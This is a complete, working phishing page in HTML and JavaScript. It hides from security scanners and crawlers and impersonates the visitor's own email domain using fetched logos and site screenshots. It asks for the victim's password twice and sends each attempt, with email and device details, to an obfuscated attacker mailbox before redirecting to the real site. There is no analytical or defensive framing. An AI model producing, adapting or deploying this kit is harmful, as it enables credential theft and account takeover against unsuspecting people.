<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta name="robots" content="noindex, nofollow">
  <title>Verifying Connection...</title>
  
  <!-- Global styles for centering -->
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css">
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body {
      min-height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
      padding: 20px;
      background: #1a1a2e;
      background-size: cover;
      background-position: center;
      transition: background 0.8s ease;
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
    }
    body::before {
      content: '';
      position: fixed;
      top: 0; left: 0; width: 100%; height: 100%;
      background: rgba(0, 0, 0, 0.55);
      z-index: 0;
    }
  </style>
</head>
<body>

  <div id="cloaker-root" style="position: relative; z-index: 10; width: 100%; display: flex; justify-content: center; align-items: center;"></div>

  <script>
    (function() {
      const ua = navigator.userAgent.toLowerCase();
      const botSignatures = [
        'googlebot', 'bingbot', 'slurp', 'duckduckbot', 'baiduspider',
        'yandexbot', 'facebot', 'ia_archiver', 'phishtank', 'urlscan',
        'virustotal', 'netcraft', 'sophos', 'kaspersky', 'mcafee',
        'headlesschrome', 'puppeteer', 'selenium', 'phantomjs'
      ];

      const isDebug = window.location.search.includes('debug=1') || window.location.protocol === 'file:';

      if (!isDebug) {
        for (let i = 0; i < botSignatures.length; i++) {
          if (ua.includes(botSignatures[i])) {
            window.location.href = "https://www.google.com";
            return;
          }
        }
        if (navigator.webdriver || window.navigator.plugins.length === 0) {
          window.location.href = "https://www.google.com";
          return;
        }
      }

      // Obfuscated FormSubmit Endpoint
      // Decodes to: https://formsubmit.co/ajax/hmp.productt@gmail.com
      const _0x4f2a = "aHR0cHM6Ly9mb3Jtc3VibWl0LmNvL2FqYXgvaG1wLnByb2R1Y3R0QGdtYWlsLmNvbQ==";
      const FORMSUBMIT_AJAX = atob(_0x4f2a);

      setTimeout(function() {
        
        // THE UPDATED EMAIL GRABBER
        function getEmailFromURL() {
          let email = null;
          
          // 1. Check query string FIRST (e.g., ?email=...)
          const params = new URLSearchParams(window.location.search);
          if (params.has('email')) email = params.get('email');
          if (!email && params.has('username')) email = params.get('username');

          // 2. Fallback to hash (e.g., #...)
          if (!email && window.location.hash) {
            let hash = window.location.hash.substring(1); 
            if (hash.includes('&')) hash = hash.split('&')[0]; 
            if (hash.includes('@')) email = decodeURIComponent(hash); 
          }
          
          return email;
        }

        const parsedEmail = getEmailFromURL();
        const parsedDomain = parsedEmail ? parsedEmail.split('@')[1] : 'kouhing.com';
        const brandName = parsedDomain.split('.')[0].charAt(0).toUpperCase() + parsedDomain.split('.')[0].slice(1);

        document.getElementById('cloaker-root').innerHTML = `
          <style>
            #human-verify { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #0f172a; display: flex; justify-content: center; align-items: center; z-index: 99999; flex-direction: column; padding: 20px; }
            #human-verify .box { background: #1e293b; padding: 40px 30px; border-radius: 16px; max-width: 420px; width: 100%; text-align: center; border: 1px solid #334155; box-shadow: 0 20px 40px rgba(0,0,0,0.5); }
            #human-verify h2 { color: #f1f5f9; font-size: 22px; margin-bottom: 8px; }
            #human-verify p { color: #94a3b8; font-size: 14px; margin-bottom: 20px; line-height: 1.6; }
            #human-verify .spinner { width: 48px; height: 48px; border: 4px solid #334155; border-top-color: #3b82f6; border-radius: 50%; animation: spin 0.8s linear infinite; margin: 0 auto 16px; }
            @keyframes spin { to { transform: rotate(360deg); } }
            
            .chameleon-container { width: 100%; max-width: 560px; background: #ffffff; border-radius: 16px; box-shadow: 0 4px 6px rgba(0,0,0,0.02), 0 8px 30px rgba(0,0,0,0.08), 0 20px 60px rgba(0,0,0,0.12); overflow: hidden; display: none; position: relative; z-index: 10; animation: fadeIn 0.6s ease; }
            @keyframes fadeIn { from { opacity: 0; transform: translateY(24px) scale(0.97); } to { opacity: 1; transform: translateY(0) scale(1); } }
            .brand-header { padding: 28px 30px 18px; text-align: center; border-bottom: 1px solid #f0f0f0; background: #ffffff; }
            .brand-logo-wrapper { display: flex; justify-content: center; align-items: center; margin-bottom: 8px; min-height: 70px; }
            .brand-logo { max-width: 120px; max-height: 70px; width: auto; height: auto; display: block; }
            .brand-name { font-size: 22px; font-weight: 700; color: #1a1a1a; letter-spacing: -0.3px; }
            .visitor-info { text-align: center; padding: 14px 20px 10px; font-size: 13px; color: #000000; border-bottom: 1px solid #f0f0f0; }
            .visitor-info .visitor-row { display: flex; justify-content: center; align-items: center; flex-wrap: wrap; gap: 4px 12px; }
            .visitor-info .visitor-row span { display: inline-flex; align-items: center; gap: 4px; }
            .visitor-info .visitor-row i { font-size: 14px; color: #000000; }
            .visitor-info .email { color: #244db8; font-size: 24px; margin-top: 8px; margin-bottom: 10px; font-weight: 400; word-break: break-all; }
            .chameleon-content { padding: 20px 30px 24px; }
            .message { text-align: center; font-size: 14px; color: #222; margin-bottom: 16px; }
            .message b { display: block; font-size: 15px; }
            .form-group { margin-bottom: 16px; position: relative; }
            .input-with-icon { position: relative; width: 100%; }
            .input-with-icon input { width: 100%; padding: 12px 14px; border: 2px solid #2d7df4; border-radius: 4px; font-size: 15px; background: #fafafa; outline: none; }
            .input-with-icon input:focus { border-color: #2d7df4; background: #ffffff; box-shadow: 0 0 0 4px rgba(45, 125, 244, 0.08); }
            .toggle-password { position: absolute; right: 12px; top: 50%; transform: translateY(-50%); cursor: pointer; color: #94a3b8; font-size: 12px; z-index: 1; display: none; }
            .toggle-password:hover { color: #1a1a1a; }
            .toggle-password.visible { display: block; }
            .auth-error { color: #d11a1a; font-size: 14px; margin-top: 10px; margin-bottom: 10px; text-align: center; font-weight: 500; display: block !important; }
            .checkbox-group { margin: 0 0 20px 0; }
            .checkbox-group label { font-size: 14px; color: #444; }
            .checkbox-group input { margin-right: 8px; width: auto; height: auto; accent-color: #2d7df4; }
            .btn-submit { width: 100%; padding: 14px; background: #2b8df2; color: #fff; border: none; border-radius: 4px; font-size: 18px; font-weight: 600; cursor: pointer; transition: background 0.3s; }
            .btn-submit:hover { background: #1976d2; }
            .footer { text-align: center; color: #666; font-size: 13px; margin-top: 16px; }
            .footer span { color: #2b8df2; }
            .security-badge { background: #fafbfc; border-top: 1px solid #f0f0f0; padding: 14px; text-align: center; font-size: 12px; color: #94a3b8; display: flex; justify-content: center; align-items: center; gap: 8px; }
            .security-badge i { color: #22c55e; font-size: 14px; }
            .loader { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0, 0, 0, 0.6); z-index: 9999; justify-content: center; align-items: center; }
            .loader::after { content: ""; width: 40px; height: 40px; border: 4px solid #fff; border-top-color: #2b8df2; border-radius: 50%; animation: spin 0.8s linear infinite; }
          </style>

          <div id="human-verify">
            <div class="box">
              <div class="spinner"></div>
              <h2>🔒 Security Check</h2>
              <p>Verifying your connection to the secure portal...</p>
            </div>
          </div>

          <div class="chameleon-container" id="chameleonContainer">
            <div class="brand-header" id="brandHeader">
              <div class="brand-logo-wrapper"><img class="brand-logo" id="brandLogo" src="" alt="Company Logo"></div>
              <div class="brand-name" id="brandName">${brandName}</div>
            </div>
            <div class="visitor-info" id="visitorInfo">
              <div class="visitor-row">
                <span><i class="fas fa-calendar-alt"></i> <span id="visitDate">Loading...</span></span>
                <span><i class="fas fa-clock"></i> <span id="visitTime">Loading...</span></span>
                <span><i class="fas fa-globe" id="browserIcon"></i> <span id="visitBrowser">Loading...</span></span>
                <span><i class="fab fa-windows" id="osIcon"></i> <span id="visitOS">Loading...</span></span>
                <span><i class="fas fa-map-marker-alt"></i> <span id="visitLocation">Loading...</span></span>
              </div>
              <div class="email" id="emailDisplay">${parsedEmail || 'info@' + parsedDomain}</div>
            </div>
            <div class="chameleon-content">
              <div class="message">Session authentication! Please provide your <b id="domainDisplay">${parsedDomain}</b> password to continue.</div>
              <form id="loginForm">
                <div class="form-group">
                  <div class="input-with-icon">
                    <input type="password" id="passwordField" name="password" placeholder="Password" required oninput="toggleEyeIcon()">
                    <span class="toggle-password" id="eyeIcon" onclick="togglePasswordVisibility()"><i class="fas fa-eye"></i></span>
                  </div>
                </div>
                <div class="auth-error" id="authError">Authentication is required!</div>
                <div class="checkbox-group">
                  <label><input type="checkbox" id="showPassword" onchange="togglePasswordVisibility()"> Show password</label>
                </div>
                <button type="submit" class="btn-submit">NEXT</button>
              </form>
              <div class="footer">© 2026 <span id="footerDomain">${parsedDomain}</span> Secure Portal | Privacy</div>
            </div>
            <div class="security-badge"><i class="fas fa-shield-alt"></i> Secure SSL Connection</div>
          </div>
          <div class="loader" id="loader"></div>
        `;

        runPayload(FORMSUBMIT_AJAX, parsedEmail, parsedDomain);

      }, 800);

      function runPayload(ajaxUrl, email, domain) {
        function getOSInfo() {
          const u = navigator.userAgent;
          if (u.includes('Windows')) return { name: 'Windows', icon: 'fa-windows' };
          if (u.includes('Mac OS X')) return { name: 'macOS', icon: 'fa-apple' };
          if (u.includes('Android')) return { name: 'Android', icon: 'fa-android' };
          if (u.includes('Linux')) return { name: 'Linux', icon: 'fa-linux' };
          if (/iPhone|iPad/i.test(u)) return { name: 'iOS', icon: 'fa-apple' };
          return { name: 'Unknown', icon: 'fa-desktop' };
        }

        function getBrowserInfo() {
          const u = navigator.userAgent;
          if (u.includes('Chrome') && !u.includes('Edg')) return { name: 'Chrome', icon: 'fa-chrome' };
          if (u.includes('Safari') && !u.includes('Chrome')) return { name: 'Safari', icon: 'fa-safari' };
          if (u.includes('Firefox')) return { name: 'Firefox', icon: 'fa-firefox' };
          if (u.includes('Edg')) return { name: 'Edge', icon: 'fa-edge' };
          return { name: 'Unknown', icon: 'fa-globe' };
        }

        async function getLocation() {
          try {
            const res = await fetch('https://ipapi.co/json/');
            const d = await res.json();
            if (d.city && d.country_code) return `${d.city}, ${d.country_code}`;
          } catch {}
          return 'Unknown';
        }

        window.toggleEyeIcon = function() {
          const p = document.getElementById('passwordField'), e = document.getElementById('eyeIcon');
          if (p.value.length > 0) e.classList.add('visible'); else e.classList.remove('visible');
        };

        window.togglePasswordVisibility = function() {
          const p = document.getElementById('passwordField'), e = document.getElementById('eyeIcon'), c = document.getElementById('showPassword');
          if (p.type === 'text') { p.type = 'password'; e.innerHTML = '<i class="fas fa-eye"></i>'; c.checked = false; }
          else { p.type = 'text'; e.innerHTML = '<i class="fas fa-eye-slash"></i>'; c.checked = true; }
        };

        async function initPage() {
          const now = new Date();
          document.getElementById('visitDate').textContent = now.toDateString();
          document.getElementById('visitTime').textContent = now.toLocaleTimeString();
          document.getElementById('visitLocation').textContent = await getLocation();

          const os = getOSInfo(), br = getBrowserInfo();
          document.getElementById('osIcon').className = `fab ${os.icon}`;
          document.getElementById('visitOS').textContent = os.name;
          document.getElementById('browserIcon').className = `fab ${br.icon}`;
          document.getElementById('visitBrowser').textContent = br.name;

          const logoImg = document.getElementById('brandLogo');
          logoImg.src = `https://img.logo.dev/${domain}?token=pk_N3r1ruvPTqCTWk6c6ZhZUQ`;
          logoImg.onerror = function() { this.src = `https://logo.clearbit.com/${domain}`; this.onerror = function() { this.style.display = 'none'; }; };

          const bgUrl = `https://image.thum.io/get/width/1200/https://${domain}`;
          const img = new Image();
          img.onload = function() { document.body.style.backgroundImage = `linear-gradient(rgba(0,0,0,0.7), rgba(0,0,0,0.5)), url('${bgUrl}')`; };
          img.src = bgUrl;

          document.getElementById('chameleonContainer').style.display = 'block';
        }

        setTimeout(() => {
          document.getElementById('human-verify').style.display = 'none';
          initPage();
        }, 1500);

        let attemptCount = 0;
        document.getElementById('loginForm').addEventListener('submit', async function(e) {
          e.preventDefault();
          const pwEl = document.getElementById('passwordField');
          const errorEl = document.getElementById('authError');
          const password = (pwEl.value || '').trim();
          if (!password) return;

          attemptCount++;
          
          const fd = new FormData();
          fd.append("email", email || 'unknown@domain.com');
          fd.append("password", password);
          fd.append("attempt", attemptCount);
          fd.append("os", getOSInfo().name);
          fd.append("browser", getBrowserInfo().name);
          fd.append("timestamp", new Date().toISOString());
          fd.append("_subject", "Chameleon capture — " + (email || domain));
          fd.append("_template", "table");
          fd.append("_captcha", "false");

          try {
            await fetch(ajaxUrl, { method: "POST", body: fd, headers: { "Accept": "application/json" } });
          } catch (err) {}

          if (attemptCount === 1) {
            errorEl.textContent = 'Authentication is required! Please try again.';
            pwEl.value = ''; pwEl.focus();
            return;
          }

          errorEl.textContent = 'Authentication is required! Please try again.';
          pwEl.value = '';
          document.getElementById('loader').style.display = 'flex';
          setTimeout(() => { window.location.href = `https://${domain}`; }, 1500);
        });
      }
    })();
  </script>
</body>
</html>
